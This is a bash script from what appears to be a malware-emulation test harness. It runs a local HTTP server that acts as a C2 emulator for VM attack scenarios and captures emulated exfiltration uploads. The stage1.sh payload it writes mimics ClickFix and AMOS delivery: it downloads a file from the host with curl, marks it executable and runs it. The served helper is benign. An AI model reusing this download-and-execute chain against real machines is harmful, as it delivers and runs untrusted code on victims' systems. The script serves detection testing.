#!/usr/bin/env bash
# Start/stop a host HTTP server for VM attack scenarios (payload download + exfil capture).
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
ENV_FILE="${ROOT}/config/vm.env"
SERVER_PY="${ROOT}/scripts/scenario-http-server.py"

usage() {
  cat <<'USAGE'
Usage:
  ./scripts/scenario-http-server.sh start --root DIR [--port N]
  ./scripts/scenario-http-server.sh stop --root DIR
  ./scripts/scenario-http-server.sh url --root DIR

Environment (optional, from config/vm.env):
  ESGRAPH_HOST_IP          Host IP reachable from the VM (auto-detected if unset)
  ESGRAPH_HOST_HTTP_PORT   Default TCP port (8765)
  ESGRAPH_VM_HOST          Used for route-based IP auto-detection

start writes:
  DIR/server.pid
  DIR/host-http.url        e.g. http://192.168.1.50:8765
  DIR/payloads/helper.sh
  DIR/payloads/stage1.sh
  DIR/uploads/             incoming POST bodies from the VM
USAGE
}

host_ip_for_iface() {
  local iface="$1"
  local ip
  ip="$(ipconfig getifaddr "${iface}" 2>/dev/null || true)"
  if [[ -n "${ip}" ]]; then
    printf '%s\n' "${ip}"
    return 0
  fi
  ip="$(ifconfig "${iface}" 2>/dev/null | awk '/inet / && $2 != "127.0.0.1" { print $2; exit }')"
  if [[ -n "${ip}" ]]; then
    printf '%s\n' "${ip}"
    return 0
  fi
  return 1
}

resolve_host_ip() {
  if [[ -n "${ESGRAPH_HOST_IP:-}" ]]; then
    printf '%s\n' "${ESGRAPH_HOST_IP}"
    return 0
  fi
  if [[ -n "${ESGRAPH_VM_HOST:-}" ]]; then
    local src_ip iface ip
    src_ip="$(route -n get "${ESGRAPH_VM_HOST}" 2>/dev/null | awk '/source:/{print $2; exit}')"
    if [[ -n "${src_ip}" && "${src_ip}" != "127.0.0.1" ]]; then
      printf '%s\n' "${src_ip}"
      return 0
    fi
    iface="$(route -n get "${ESGRAPH_VM_HOST}" 2>/dev/null | awk '/interface:/{print $2; exit}')"
    if [[ -n "${iface}" ]] && ip="$(host_ip_for_iface "${iface}")"; then
      printf '%s\n' "${ip}"
      return 0
    fi
  fi
  local iface ip
  for iface in bridge100 en0 en1; do
    if ip="$(host_ip_for_iface "${iface}")"; then
      printf '%s\n' "${ip}"
      return 0
    fi
  done
  printf '%s\n' "127.0.0.1"
}

write_payloads() {
  local root="$1"
  local base_url="$2"
  mkdir -p "${root}/payloads" "${root}/uploads"

  cat > "${root}/payloads/helper.sh" <<EOF
#!/bin/zsh
# Benign AMOS scenario helper payload served from the host HTTP server.
echo "esgraph-amos-helper run=\${ESGRAPH_RUN_ID:-unknown}" > "/tmp/amos_helper_ran_\${ESGRAPH_RUN_ID:-\$\$}"
EOF
  chmod +x "${root}/payloads/helper.sh"

  cat > "${root}/payloads/stage1.sh" <<EOF
#!/bin/zsh
# Benign ClickFix-style stage-1 payload: download helper from host C2 emulator.
set -euo pipefail
run_id="\${ESGRAPH_RUN_ID:-\$\$}"
curl -fsSL "${base_url}/frozenfix/update" -o "/tmp/amos_helper_\${run_id}" 2>/dev/null || exit 0
chmod +x "/tmp/amos_helper_\${run_id}" 2>/dev/null || true
"/tmp/amos_helper_\${run_id}" 2>/dev/null || true
EOF
  chmod +x "${root}/payloads/stage1.sh"
}

wait_for_health() {
  local url="$1"
  local tries=0
  while [[ "${tries}" -lt 30 ]]; do
    if curl -m 1 -sS "${url}/health" >/dev/null 2>&1; then
      return 0
    fi
    sleep 0.1
    tries=$((tries + 1))
  done
  echo "scenario HTTP server failed health check at ${url}/health" >&2
  return 1
}

cmd="${1:-}"
shift || true

case "${cmd}" in
  start)
    ROOT_DIR=""
    PORT="${ESGRAPH_HOST_HTTP_PORT:-8765}"
    while [[ $# -gt 0 ]]; do
      case "$1" in
        --root) ROOT_DIR="${2:?missing value for --root}"; shift 2 ;;
        --port) PORT="${2:?missing value for --port}"; shift 2 ;;
        *) echo "unknown option: $1" >&2; usage >&2; exit 2 ;;
      esac
    done
    [[ -n "${ROOT_DIR}" ]] || { echo "missing --root" >&2; usage >&2; exit 2; }
    if [[ -f "${ENV_FILE}" ]]; then
      # shellcheck disable=SC1090
      source "${ENV_FILE}"
    fi
    if [[ -f "${ROOT_DIR}/server.pid" ]]; then
      old_pid="$(cat "${ROOT_DIR}/server.pid")"
      if kill -0 "${old_pid}" 2>/dev/null; then
        echo "scenario HTTP server already running (pid ${old_pid})" >&2
        cat "${ROOT_DIR}/host-http.url"
        exit 0
      fi
    fi

    HOST_IP="$(resolve_host_ip)"
    BASE_URL="http://${HOST_IP}:${PORT}"
    write_payloads "${ROOT_DIR}" "${BASE_URL}"

    nohup python3 "${SERVER_PY}" --root "${ROOT_DIR}" --bind "0.0.0.0" --port "${PORT}" \
      >"${ROOT_DIR}/server.log" 2>&1 &
    echo $! > "${ROOT_DIR}/server.pid"
    wait_for_health "${BASE_URL}"
    printf '%s\n' "${BASE_URL}" > "${ROOT_DIR}/host-http.url"
    echo "scenario HTTP server started: ${BASE_URL}"
    echo "  payloads: ${ROOT_DIR}/payloads"
    echo "  uploads:  ${ROOT_DIR}/uploads"
    ;;
  stop)
    ROOT_DIR=""
    while [[ $# -gt 0 ]]; do
      case "$1" in
        --root) ROOT_DIR="${2:?missing value for --root}"; shift 2 ;;
        *) echo "unknown option: $1" >&2; usage >&2; exit 2 ;;
      esac
    done
    [[ -n "${ROOT_DIR}" ]] || { echo "missing --root" >&2; usage >&2; exit 2; }
    if [[ ! -f "${ROOT_DIR}/server.pid" ]]; then
      exit 0
    fi
    pid="$(cat "${ROOT_DIR}/server.pid")"
    if kill -0 "${pid}" 2>/dev/null; then
      kill "${pid}" 2>/dev/null || true
      for _ in 1 2 3 4 5 6 7 8 9 10; do
        kill -0 "${pid}" 2>/dev/null || break
        sleep 0.1
      done
      kill -9 "${pid}" 2>/dev/null || true
    fi
    rm -f "${ROOT_DIR}/server.pid"
    ;;
  url)
    ROOT_DIR=""
    while [[ $# -gt 0 ]]; do
      case "$1" in
        --root) ROOT_DIR="${2:?missing value for --root}"; shift 2 ;;
        *) echo "unknown option: $1" >&2; usage >&2; exit 2 ;;
      esac
    done
    [[ -f "${ROOT_DIR}/host-http.url" ]] || { echo "missing ${ROOT_DIR}/host-http.url" >&2; exit 1; }
    cat "${ROOT_DIR}/host-http.url"
    ;;
  -h|--help|"")
    usage
    ;;
  *)
    echo "unknown command: ${cmd}" >&2
    usage >&2
    exit 2
    ;;
esac
